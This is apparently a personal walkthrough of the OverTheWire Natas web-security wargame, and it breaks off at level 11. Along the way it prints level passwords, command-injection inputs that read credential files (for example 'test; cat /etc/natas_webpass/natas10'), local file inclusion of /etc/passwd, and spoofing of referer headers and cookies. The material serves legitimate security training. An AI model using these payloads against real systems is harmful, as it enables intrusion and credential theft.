# Natas - web security

## Natas Level 0

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

Inspect page -> password inside a comment in the body

## Natas Level 0 → Level 1

```
Username:         natas1
Next Password:    0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
URL:              http://natas1.natas.labs.overthewire.org
```

\
Page says right clicking has been blocked - However the block is done in correctly and does not apply to the whole page. Even if it was CTRL + SHIFT + I (Firefox) would bypass this block\
Once the inspector is open the password can once again be found inside a comment

## Natas Level 1 → Level 2

```
Username:         natas2
Next Password:    3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
URL:              http://natas2.natas.labs.overthewire.org
```

See requests made for /files/pixel.png accessing /files folder reveals a user.txt with the password for natas3

## Natas Level 2 → Level 3

```
Username:         natas3
Next Password:    QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
URL:              http://natas3.natas.labs.overthewire.org
```

Inspecting reveals a comment inside the html "No more information leaks!! Not even Google will find it this time..."\
Made me check for /robots.txt:

```
User-agent: *
Disallow: /s3cr3t/
```

Going to /s3cr3t/ revealed another users.txt inside it with the next password

## Natas Level 3 → Level 4

```
Username:         natas4
Next Password:    0n35PkggAPm2zbEpOU802c0x0Msn1ToK
URL:              http://natas4.natas.labs.overthewire.org
```

Visiting the site it practically tells you what to do:

> Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org

So my solution was:

```
curl http://natas4.natas.labs.overthewire.org/index.php -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/
```

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

> Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

## Natas Level 4 → Level 5

```
Username:         natas5
Next Password:    0RoJwHdSKWFTYR5WuiAewauSuNaBXned
URL:              http://natas5.natas.labs.overthewire.org
```

Upon accessing the site an error is shown:

> Access disallowed. You are not logged in

Checking cookies a cookie named **loggedin** with the value set to **0** is discovered.\
Changing this value to **1** and refreshing the page revealed the password.

> Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

## Natas Level 5 → Level 6

```
Username:         natas6
Next Password:    bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
URL:              http://natas6.natas.labs.overthewire.org
```

The page now asks for a second password using the following, exposed script [View sourcecode](http://natas6.natas.labs.overthewire.org/index-source.html)

```javascript
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

This leads us to the following directory and file:\
[http://natas6.natas.labs.overthewire.org/includes/secret.inc](http://natas6.natas.labs.overthewire.org/includes/secret.inc)\
Which exposed the secret for the 2nd login

> Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

## Natas Level 6 → Level 7

```
Username:         natas7
Next Password:    xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
URL:              http://natas7.natas.labs.overthewire.org
```

Therw are 2 buttons Home and About which open links like this [http://natas7.natas.labs.overthewire.org/index.php?page=about](http://natas7.natas.labs.overthewire.org/index.php?page=about)

Accessing a random page like [http://natas7.natas.labs.overthewire.org/index.php?page=password](http://natas7.natas.labs.overthewire.org/index.php?page=password)

The site presents the following output

> Warning: include(password): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21
>
> Warning: include(): Failed opening 'password' for inclusion (include\_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21

This output looks suspiciously vulnerable to [LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)

Testing for [http://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd) proves this suspicion

> root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/ :x\
> ...

Viewing the html file of the page revealed a hint for the correct file to access:\
[http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas\_webpass/natas8](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8)

## Natas Level 7 → Level 8

```
Username:         natas8
Next Password:    ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
URL:              http://natas8.natas.labs.overthewire.org
```

We are immediately shown a prompt to enter some sort of secret and a button to view the source code used for this field

```javascript
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Putting the string into [CyberChef](https://gchq.github.io/CyberChef/) with the following recipe revealed the decoded string:

Input: 3d3d516343746d4d6d6c315669563362\
From Hex -> Reverse -> From Base64\
Output: oubWYf2kBq

Entering this secret into the field revealed the password for the level 9

## Natas Level 8 → Level 9

```
Username:         natas9
Next Password:    t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
URL:              http://natas9.natas.labs.overthewire.org
```

Another small application. This one directly inserts the user provided input into php without any sanitisation.

```javascript
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

We can abuse this by test; pwd and get the following output

```
/var/www/natas/natas9
```

Using the hint from level 7 I used the following command to get the next password

```
test; cat /etc/natas_webpass/natas10
```

## Natas Level 9 → Level 10 <a href="#natas-level-8-level-9" id="natas-level-8-level-9"></a>

```
Username:         natas10
Next Password:    UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
URL:              http://natas10.natas.labs.overthewire.org
```

Same deal as before, except now certain characters are considered illegal.\
This match is far to limited and overall not very effective a simple dot can bypass it completely.

```javascript
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

The following input revealed the next password

```
. /etc/natas_webpass/natas11
```

## Natas Level 10 → Level 11 <a href="#natas-level-8-level-9" id="natas-level-8-level-9"></a>

```
Username:         natas11
Next Password:    
URL:              http://natas11.natas.labs.overthewire.org
```

Now we are show a hint that **Cookies are protected with XOR encryption** and a field to change the background colour.
